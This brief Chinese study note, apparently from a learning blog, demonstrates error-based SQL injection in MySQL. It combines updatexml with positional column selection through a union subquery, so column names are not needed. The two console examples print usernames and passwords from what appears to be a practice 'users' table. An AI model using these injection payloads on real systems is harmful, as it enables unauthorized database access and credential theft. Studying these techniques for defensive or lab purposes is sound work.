之前学过在不用爆列的情况下直接获取列名，移位注入也能在报错注入里用到。一个例子如下
```mysql
mysql> select * from users where id=0 and updatexml(1,concat(0x7e,(select `3` fr
om (select 1,2,3 union select * from users)a limit 1,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~Dumb~'

mysql> select * from users where id=0 and updatexml(1,concat(0x7e,(select group_
concat(`3`) from (select 1,2,3 union select * from users)a),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~3,Dumb,I-kill-you,p@ssword,crap'
```